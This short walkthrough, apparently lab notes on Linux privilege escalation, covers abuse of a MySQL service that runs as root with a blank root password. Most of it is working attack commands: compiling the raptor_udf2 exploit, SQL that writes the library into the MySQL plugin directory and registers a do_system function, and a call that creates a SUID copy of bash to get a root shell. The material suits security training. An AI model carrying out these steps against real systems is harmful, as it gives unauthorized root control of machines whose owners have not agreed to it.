# mysql running as root

The MySQL service is running as root and the "root" user for the service does not have a password assigned. We can use a [popular exploit](https://www.exploit-db.com/exploits/1518) that takes advantage of User Defined Functions (UDFs) to run system commands as root via the MySQL service.

Change into the mysql-udf directory downloaded from the above link:

Compile the raptor\_udf2.c exploit code using the following commands:

`gcc -g -c raptor_udf2.c -fPIC`\
`gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc`



Connect to the MySQL service as the root user with a blank password:

`mysql -u root`\


Execute the following commands on the MySQL shell to create a User Defined Function (UDF) "do\_system" using our compiled exploit:

`use mysql;`\
`create table foo(line blob);`\
`insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));`\
`select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';`\
`create function do_system returns integer soname 'raptor_udf2.so';`

Use the function to copy /bin/bash to /tmp/rootbash and set the SUID permission:

`select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');`

Exit out of the MySQL shell (type exit or \q and press Enter) and run the /tmp/rootbash executable with -p to gain a shell running with root privileges:

`/tmp/rootbash -p`
